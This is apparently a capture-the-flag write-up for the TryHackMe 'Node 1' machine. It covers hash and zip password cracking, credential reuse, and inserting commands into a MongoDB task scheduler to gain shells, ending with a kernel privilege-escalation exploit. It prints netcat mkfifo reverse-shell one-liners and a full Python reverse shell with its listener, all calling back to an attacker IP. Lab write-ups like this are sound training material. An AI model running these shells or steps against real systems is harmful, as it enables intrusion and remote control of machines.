---
layout: post
title:  "Node 1"
date:   2020-04-17 00:13:21 -0400
category: [writeups]
challenge-source: [TryHackMe]
challenge-category: ['boot2root']
tags: [TryHackMe]
author: shinris3n
---

<a href = "https://tryhackme.com/" target="_blank"><img src="/assets/writeups/TryHackMe/THMlogo.png" width="225"></a>

- First, we start out with some basic enumeration:

{% highlight bash %}
sudo nmap -A 10.10.123.120
{% endhighlight %}

![Nmap Output](/assets/writeups/TryHackMe/Node1/14-1.png)


- We find that SSH is open as well as port 3000. 

- Inspection of the source code for website hosted at 10.10.123.120:3000 reveals some interesting script names:

![Website Sourcecode](/assets/writeups/TryHackMe/Node1/14-2.png)

- In particular, home.js reveals an internal path, which we're able to access via the browser.

![Website Path 1](/assets/writeups/TryHackMe/Node1/14-3.png)
![Website Path 2](/assets/writeups/TryHackMe/Node1/14-4.png)

- Shaving off a bit of this path reveals an admin account as well:

![Website Path 2](/assets/writeups/TryHackMe/Node1/14-5.png)

- Next, we can use hash-identifier to determine that this probably SHA-256:

![Hash-Identifier](/assets/writeups/TryHackMe/Node1/14-6.png)

- Then we can proceed to use hashcat to try to crack the admin account (1400 corresponds to SHA-256).

{% highlight bash %}
hashcat -m 1400 -a 0 crackthispw.txt /usr/share/wordlists/rockyou.txt --force
{% endhighlight %}

![Hashcat 1](/assets/writeups/TryHackMe/Node1/14-7.png)
![Hashcat 2](/assets/writeups/TryHackMe/Node1/14-8.png)

- We can now go back to the main page and log in with these credentials.

![Admin Login](/assets/writeups/TryHackMe/Node1/14-9.png)

- Checking out the file that we can download after logging in, it looks to be encoded. 

![Encoded File](/assets/writeups/TryHackMe/Node1/14-10.png)

- Throwing the file up on CyberChef and using the Magic function with defaults reveals that this was a B64 encoded zip file.

![CyberChef](/assets/writeups/TryHackMe/Node1/14-11.png)

- You can then click to load the recipe as noted in the first output field and download the result, renaming it as filename.zip. However, as Zeddicus Zu'l Zorander once said: “Nothing is ever easy.” - the zip is also password protected.

{% highlight bash %}
fcrackzip -v -D -u -p '/usr/share/wordlists/rockyou.txt' myplacebackup_decoded.zip
{% endhighlight %}

![Fcrackzip Output](/assets/writeups/TryHackMe/Node1/14-12.png)

- Ok, well maybe that *was* easy, but there's a lot more to go still. Now we can dig through the files. We find some fantastic artwork in app.js...

![Trololol](/assets/writeups/TryHackMe/Node1/14-13.png)

- ...but don't let that distract us from the user mark's mongodb credentials in plaintext on top.

![Credentials](/assets/writeups/TryHackMe/Node1/14-14.png)

- As it turns out, these are also the SSH credentials for mark. This password is actually the TryHackMe user flag too, even though you'll find a file called user.txt in the user tom's directory upon logging in as mark.

- Once inside, checking out the processes reveals that tom is running that app.js file using the binary /usr/bin/node from two spots: /var/www (which is the path we had the backup file for), but also /var/scheduler. The version of this in /var/scheduler is really interesting, however.

![PS Output](/assets/writeups/TryHackMe/Node1/14-15.png)

![Scheduler](/assets/writeups/TryHackMe/Node1/14-16.png)

- It appears that this version of app.js connects to the database, reads from ‘tasks’, executes whatever command is there, then deletes the entry, on a 30 second cycle.

- We now need to figure out the syntax needed to actually make a connection to the database with the intent of adding a task that opens up a shell to our machine. It seems like it should be as simple as using the contents of the url variable, but authMechanism actually needs to be removed for this to work correctly.

{% highlight bash %}
mongo mongodb://mark:markspw@localhost:27017/scheduler?authSource=scheduler
{% endhighlight %}

- Before we go further, we can grab some code [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"} for a reverse shell.

- One strategy is to add a command that runs netcat, since that is actually installed on the target machine. As information in the link above provides, since the target machine doesn't allow the \-e flag, we have to use the syntax:

{% highlight bash %}
‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f’
{% endhighlight %}

- Another approach, if we don't want to rely on netcat being available, is to use a pair of Python scripts as found [here](https://github.com/trackmastersteve/shell){:target="_blank"}.

- This code goes on the target machine in the /tmp directory:
{% highlight python %}
#!/usr/bin/python3

import os
import socket
import subprocess

HOST = '10.11.3.185' # The ip of the listener.
PORT = 2468 # The same port as listener.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT)) # Connect to listener.
s.send(str.encode("[*] Connection Established!")) # Send connection confirmation.

while 1: # Start loop.
data = s.recv(1024).decode("UTF-8") # Recieve shell command.
if data == "quit":
break # If it's quit, then break out and close socket.
if data[:2] == "cd":
os.chdir(data[3:]) # If it's cd, change directory.
# Run shell command.
if len(data) > 0:
proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
output_str = str(stdout_value, "UTF-8") # Format output.
currentWD = os.getcwd() + "> " # Get current working directory.
s.send(str.encode(currentWD + output_str)) # Send output to listener.

s.close() # Close socket.
{% endhighlight %}

- This code goes on your machine:

{% highlight python %}
#!/usr/bin/python3

from socket import *

HOST = '' # '' means bind to all interfaces.
PORT = 2468 # Port.

s = socket(AF_INET, SOCK_STREAM) # Create our socket handler.
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) # Set is so that when we cancel out we can reuse port.
try:
s.bind((HOST, PORT)) # Bind to interface.
print("[*] Listening on 0.0.0.0:%s" % str(PORT)) # Print we are accepting connections.
s.listen(10) # Listen for only 10 unaccepted connections.
conn, addr = s.accept() # Accept connections.
print("[+] Connected by", addr) # Print connected by ipaddress.
data = conn.recv(1024).decode("UTF-8") # Receive initial connection.
while 1: # Start loop.
command = input("target_machine> ") # Enter shell command.
conn.send(bytes(command, "UTF-8")) # Send shell command.
if command == "quit":
break # If we specify quit then break out of loop and close socket.
data = conn.recv(1024).decode("UTF-8") # Receive output from command.
print(data) # Print the output of the command.
except KeyboardInterrupt:
print("...listener terminated using [ctrl+c], Shutting down!")
exit() # Using [ctrl+c] will terminate the listener.

conn.close() # Close socket.
{% endhighlight %}

- As a test before using it as a payload to run as the user tom, we can try this using mark's account first.

![Python sender](/assets/writeups/TryHackMe/Node1/14-17.png)
![Python listener](/assets/writeups/TryHackMe/Node1/14-18.png)

 - Now we can try to run this by modifying the mongo db task list. We need to make sure to run the listener on our machine first else we might miss that 30 second window.

{% highlight bash %}
db.tasks.insert({ "cmd": “python3 /tmp/sayhello.py” });
{% endhighlight %}

- Note: syntax errors may show up due to non-printable characters depending on where you copy/paste code from.  Try to manually enter the command if this happens.

![Python sender executed](/assets/writeups/TryHackMe/Node1/14-19.png)
![Python listener executed](/assets/writeups/TryHackMe/Node1/14-20.png)

- If you want to use the netcat method since it is available to us (and it is admittedly cleaner and less buggy while poking around), you can enter:

{% highlight bash %}
db.tasks.insert({ "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.3.185 2468 >/tmp/f" });
{% endhighlight %}

![Netcat sender executed](/assets/writeups/TryHackMe/Node1/14-21.png)
![Netcat listener executed](/assets/writeups/TryHackMe/Node1/14-22.png)

- Either way, we wind up with this piece of information after getting done with all the other rabbit holes:

{% highlight bash %}
uname -a
{% endhighlight %}

![uname -a](/assets/writeups/TryHackMe/Node1/14-23.png)

- Using searchsploit, we can find some privilege escalation scripts for this kernel version.  Note: 41457 doesn't seem to work correctly and causes the target to hang up, but 44298 works with no problems.

![Searchsploit Output](/assets/writeups/TryHackMe/Node1/14-24.png)

- We can copy the source over and build it. (Sublime Text 3 was used in the image below).

![Exploit Build](/assets/writeups/TryHackMe/Node1/14-25.png)

- Then we can set up a local web server to make it easy to grab the compiled exploit.  

![Webserver](/assets/writeups/TryHackMe/Node1/14-26.png)

- We cd into the tmp directory again, download the exploit, change the permissions appropriately, execute the binary to get root and cd into the /root directory to *finally* find the flag. Whew!

![Root Flag](/assets/writeups/TryHackMe/Node1/14-26.png)

This was a fun, educational and challenging room; totally worth pushing through to complete.